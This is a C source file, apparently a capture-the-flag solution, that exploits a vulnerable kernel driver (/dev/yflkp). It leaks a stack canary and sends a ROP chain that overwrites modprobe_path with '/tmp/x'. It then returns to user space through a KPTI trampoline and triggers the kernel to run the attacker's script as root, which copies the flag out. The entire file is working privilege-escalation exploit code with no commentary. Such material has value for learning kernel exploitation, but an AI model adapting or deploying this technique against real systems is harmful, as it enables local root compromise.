#include <fcntl.h>
#include <signal.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/types.h>

unsigned long user_cs, user_ss, user_rflags, user_sp;

void save_state() {
  __asm__(
      ".intel_syntax noprefix;"
      "mov user_cs, cs;"
      "mov user_ss, ss;"
      "mov user_sp, rsp;"
      "pushf;"
      "pop user_rflags;"
      ".att_syntax;");
  puts("[*] Saved state.");
}

void get_flag(void) {
  puts("[*] Returned to userland, setting up for fake modprobe");
  puts("[*] Run unknown file");
  system("/tmp/dummy");
  puts("[*] Hopefully flag is readable");
  system("cat /tmp/flag");
  exit(0);
}

int main() {
  save_state();
  system(
      "echo '#!/bin/sh\ncp /home/user/flag /tmp/flag\nchmod 777 /tmp/flag' > "
      "/tmp/x");
  system("chmod +x /tmp/x");
  system("echo -ne '\\xff\\xff\\xff\\xff' > /tmp/dummy");
  system("chmod +x /tmp/dummy");
  int fd = open("/dev/yflkp", O_RDWR);
  unsigned long long leakbuf[0x100];
  read(fd, leakbuf, 0x100);
  for (int i = 0; i < 0x100; i++) printf("%d | %llx\n", i, leakbuf[i]);
  unsigned long long canary = leakbuf[6];
  printf("[*] canary: %llx\n", canary);
  unsigned long long rop[50];
  memset(rop, 0, sizeof(rop));
  int i = 6;
  rop[i++] = canary;
  rop[i++] = 0;
  rop[i++] = 0;
  rop[i++] = 0;
  /*
  >>> p64(0x782f706d742f)
  b'/tmp/x\x00\x00'
  */
  rop[i++] = 0xffffffff814a3758;  // pop rbx; ret;
  rop[i++] = 0x706d742f;
  rop[i++] = 0xffffffff818a3e9d;  // pop rdi; ret;
  rop[i++] = 0xffffffff82dd82a0;  // modprobe_path
  rop[i++] = 0xffffffff818f6898;  // mov dword ptr [rdi], ebx; add dh, dh; ret;
  rop[i++] = 0xffffffff814a3758;  // pop rbx; ret;
  rop[i++] = 0x782f;
  rop[i++] = 0xffffffff818a3e9d;      // pop rdi; ret;
  rop[i++] = 0xffffffff82dd82a0 + 4;  // modprobe_path + 4
  rop[i++] = 0xffffffff818f6898;  // mov dword ptr [rdi], ebx; add dh, dh; ret;
  rop[i++] = 0xffffffff82201146;  // kpti_trampoline
  rop[i++] = 0;
  rop[i++] = 0;
  rop[i++] = (unsigned long long)get_flag;
  rop[i++] = user_cs;
  rop[i++] = user_rflags;
  rop[i++] = user_sp;
  rop[i++] = user_ss;
  rop[i++] = (unsigned long long)0x4141414141414141;  // Yes!
  write(fd, rop, sizeof(rop));
  return 0;
}